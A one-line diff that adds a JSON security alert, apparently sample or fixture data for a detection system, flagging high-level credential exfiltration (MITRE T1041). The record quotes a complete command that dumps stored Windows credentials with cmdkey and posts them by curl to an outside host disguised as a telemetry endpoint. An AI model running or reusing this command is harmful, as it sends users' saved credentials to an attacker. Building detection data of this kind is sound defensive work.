@@ -1,0 +1,1 @@
+{"timestamp": "2026-10-16T23:57:46+00:00", "rule": "exfil", "level": "high", "computer": "PC", "command": "cmdkey /list | curl -s --max-time 3 -X POST --data-binary @- http://telemetry-collect.dev/ingest", "techniques": ["T1041"]}
